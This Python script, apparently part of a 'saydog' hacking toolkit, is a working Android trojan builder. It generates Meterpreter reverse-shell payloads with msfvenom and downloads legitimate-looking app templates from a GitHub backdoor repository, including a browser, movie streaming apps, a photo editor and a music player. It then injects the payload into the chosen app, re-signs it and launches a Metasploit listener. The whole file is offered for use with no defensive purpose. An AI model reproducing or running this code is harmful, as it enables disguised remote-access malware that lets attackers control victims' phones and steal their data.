#################### import modules ####################
import os
import sys
import time
import requests
import yagmail
import uncompyle6
import random
#################### fonts colors ####################
w="\033[00m"
r="\033[31;1m"
g="\033[32;1m"
y="\033[33m"
d="\033[2;31m"
b="\033[34;1m"
p="\033[35;1m"
c="\033[36;1m"
W="\033[47m"
R="\033[41m"
B="\033[30m"
G="\033[90m"
BG="\033[100m"
#################### main menu ####################
def menu():
        try:
                global rname,host,port,outp
                os.system("postgres -D  $PREFIX/var/lib/postgresql &> /dev//null &")
                print ("")
                print (w+"{"+p+"01"+w+"} Payload android/meterpreter/reverse_tcp")
                print (w+"{"+p+"02"+w+"} Payload android/meterpreter/reverse_http")
                print (w+"{"+p+"03"+w+"} payload android/meterpreter/reverse_https")
                print ("")
                print (w+"{"+p+"00"+w+"} Back to metasploit menu")
                print ("")
                dog = str(input(r+"saydog"+w+":"+p+"/android/"+w+"> "))
                if dog == "0" or dog == "00" or dog == "back":
                        sys.exit(1)
                elif dog == "1" or dog == "01":
                        rname = "tcp"
                        pass
                elif dog == "2" or dog == "02":
                        rname = "http"
                        pass
                elif dog == "3" or dog == "03":
                        rname = "https"
                        pass
                else:
                        sys.exit(1)
                print ("")
                host = str(input("Do you want to use 127.0.0.1 as LHOST? (y/n"+w+") "))
                if host == "" or host == " ":
                        host = "127.0.0.1"
                        print ("")
                        print (b+"[+]"+w+" using default LHOST: "+host)
                        pass
                elif host == "y" or host == "Y":
                        print ("")
                        host = "127.0.0.1"
                        print (b+"[+]"+w+" set LHOST: "+host)
                        pass
                else:
                        print ("")
                        host = str(input(b+"[+]"+w+" set LHOST: "))
                        if host == "" or host ==  " ":
                                host = "127.0.0.1"
                                print ("")
                                print (b+"[+]"+w+" using default LHOST: "+host)
                                pass
                        else:
                                host = host
                                pass
                port = str(input(b+"[+]"+w+" set LPORT: "))
                if port == "" or port == " ":
                        port = "4444"
                        print (b+"[+]"+w+" using default LPORT: "+port)
                        pass
                else:
                        port = port
                        pass
                print (b+"[+]"+w+" configurating metasploit payloads")
                payload = "msfvenom -p android/meterpreter/reverse_"+str(rname)+" lhost="+str(host)+" lport="+str(port)+" --platform android --arch dalvik -o payload.apk"
                print (b+"[+]"+w+" generating payload using msfvenom")
                os.system(payload+" &> /dev//null")
                os.system("echo 'use multi/handler' > saydog.rc")
                os.system("echo 'set payload android/meterpreter/reverse_"+rname+"' >> saydog.rc")
                os.system("echo 'set LHOST "+host+"' >> saydog.rc")
                os.system("echo 'set LPORT "+port+"' >> saydog.rc")
                os.system("echo 'show options' >> saydog.rc")
                print (g+"[+]"+w+" payload successfully generated")
                print ("")
                ask = str(input("Do you want to bind payload.apk into original.apk? (y/n"+w+") "))
                if ask == "y" or ask == "Y" or ask == "yes" or ask == "Yes" or ask == "YES":
                        print ("")
                        print (g+" APK INJECTOR"+w+" - by @saydog.official")
                        print ("-------------------------------------------")
                        print (" Apk injector is a tool to embed payloads")
                        print (" into the original apk from a list")
                        print (" that was created by the author.")
                        print ("-------------------------------------------")
                        print ("")
                        print (g+"  NO  TEMPLATE NAME           DESCRIPTIONS")
                        print ("")
                        print (w+" ("+g+"01"+w+") UC_Mini.apk             Browser")
                        print (w+" ("+g+"02"+w+") Speed_test.apk          Internet speed test")
                        print (w+" ("+g+"03"+w+") Hackers_keylogger.apk   Android keylogger app")
                        print (w+" ("+g+"04"+w+") Vidmate.apk             Apps store")
                        print (w+" ("+g+"05"+w+") Droid_sqli.apk          Android sql-injection")
                        print (w+" ("+g+"06"+w+") Wps_connect.apk         Wifi password cracker")
                        print (w+" ("+g+"07"+w+") Indoxxi.apk             Streaming movies")
                        print (w+" ("+g+"08"+w+") Layarkaca21.apk         Streaming movies")
                        print (w+" ("+g+"09"+w+") Hackers_keyboard.apk    Keyboard for android")
                        print (w+" ("+g+"10"+w+") Infinite_design.apk     Design apps")
                        print (w+" ("+g+"11"+w+") PicsayPro.apk           Photo editor")
                        print (w+" ("+g+"12"+w+") Avee_player.apk         Music player")
                        print ("")
                        dog = str(input(r+"saydog"+w+":"+p+"/choose/"+w+"> "))
                        if dog == "1" or dog ==  "01":
                                tmp = "UC_Mini"
                                src = "com/"
                                pass
                        elif dog == "2" or dog == "02":
                                tmp = "Speed_test"
                                src = "pl/"
                                pass
                        elif dog == "3" or dog == "03":
                                tmp = "Hackers_keylogger"
                                src = "hack/"
                                pass
                        elif dog == "4" or dog == "04":
                                tmp = "Vidmate"
                                src = "com/"
                                pass
                        elif dog == "5" or dog == "05":
                                tmp = "Droid_sqli"
                                src = "net/"
                                pass
                        elif dog == "6" or dog == "06":
                                tmp = "Wps_connect"
                                src = "com/"
                                pass
                        elif dog == "7" or dog == "07":
                                tmp = "Indoxxi"
                                src = "com/"
                                pass
                        elif dog == "8" or dog == "08":
                                tmp = "Layarkaca21"
                                src = "com/"
                                pass
                        elif dog == "9" or dog == "09":
                                tmp = "Hackers_keyboard"
                                src = "org/"
                                pass
                        elif dog == "10":
                                tmp = "Infinite_design"
                                src = "com/"
                                pass
                        elif dog == "11":
                                tmp = "PicsayPro"
                                src = "com/"
                                pass
                        elif dog == "12":
                                tmp = "Avee_player"
                                src = "com/"
                                pass
                        else:
                                print (w)
                                print (r+"[!INVALID]"+w+" input not found!")
                                print (r+"[!INVALID]"+w+" file auto-saved as:-"+g+" modules/tmp/payload.apk"+w)
                                print (w)
                                dog = str(input("[ enter ]"))
                                if dog == "":
                                        sys.exit(0)
                                else:
                                        sys.exit(0)
                        print ("")
                        print (b+"[+]"+w+" using template:- "+g+tmp+".apk")
                        print (b+"[+]"+w+" downloading template from database")
                        os.system("wget https://github.com/saydog-official/database/raw/master/backdoor/template/"+tmp+".zip &> /dev//null")
                        print (b+"[+]"+w+" unpacking template files from database")
                        os.system("unzip "+tmp+".zip &> /dev//null;rm -rf "+tmp+".zip")
                        print (b+"[+]"+w+" decompile payload apk using apktool")
                        os.system("proot apktool d -f payload.apk &> /dev//null;rm -rf payload.apk")
                        print (b+"[+]"+w+" inject the original apk with metasploit payloads")
                        os.system("sleep 3;cp -r payload/smali/com/metasploit/ "+tmp+"/"+src)
                        print (g+"[+]"+w+" successfully injection original apk file")
                        print (b+"[+]"+w+" building original apk using apktool")
                        os.system("proot apktool241 b "+tmp+" -o original.apk &> /dev//null;rm -rf "+tmp+"/")
                        print (b+"[+]"+w+" auto generate keystore using apksigner")
                        print (b+"[+]"+w+" signing original apk using apksigner")
                        os.system("proot apk-signer -k keystore.jks -a android -s google -f app.apk -o "+tmp+"-injected.apk;rm -rf original.apk")
                        print (g+"[+]"+w+" successfully signing original apk file")
                        print (g+"[+]"+w+" android payload has been generated")
                        print ("")
                        out = str(input("save file to (example: /sdcard): "))
                        if out == "" or out == " ":
                                out = "/sdcard"
                                pass
                        else:
                                out = out
                                pass
                        print ("")
                        os.system("mv "+tmp+"-injected.apk /"+out)
                        os.system("rm -rf payload '?' &> /dev//null")
                        print (g+"[+]"+w+" file saved as:- "+g+out+"/"+tmp+"-injected.apk"+w)
                        print ("")
                        dog = str(input("Do you want to start listener? (y/n"+w+") "))
                        if dog == "y" or dog == "Y" or dog == "yes" or dog == "Yes" or dog == "YES":
                                print ("")
                                os.system("msfconsole -q -r saydog.rc")
                                pass
                        else:
                                pass
                        print ("")
                        dog = str(input("[ enter ]"))
                        if dog == "":
                                sys.exit(0)
                        else:
                                sys.exit(0)
                else:
                        print ("")
                        name = str(input(b+"[+]"+w+" set filename (example: payload): "))
                        if name == "" or name == " ":
                                name = "payload"
                                pass
                        else:
                                name = name
                                pass
                        outp = str(input(b+"[+]"+w+" save file to (example: /sdcard): "))
                        if outp == "" or outp == " ":
                                outp = "/sdcard"
                                pass
                        else:
                                outp = outp
                                pass
                        print ("")
                        os.system("mv payload.apk /"+outp+"/"+name+".apk")
                        print (g+"[+]"+w+" file saved as:- "+g+outp+"/"+name+".apk"+w)
                        print ("")
                        dog = str(input("[ enter ]"))
                        if dog == "":
                                sys.exit(0)
                        else:
                                sys.exit(0)
                                sys.exit(0)
        except KeyboardInterrupt:
                sys.exit(1)
        except ModuleNotFoundError:
                sys.exit(1)
        except NameError:
                sys.exit(1)
        except EOFError:
                sys.exit(1)
        except FileNotFoundError:
                sys.exit(1)
###################### main argv ####################
if "__main__" == __name__:
        if "--run" in sys.argv:
                menu()
        else:
                os.system("saydog")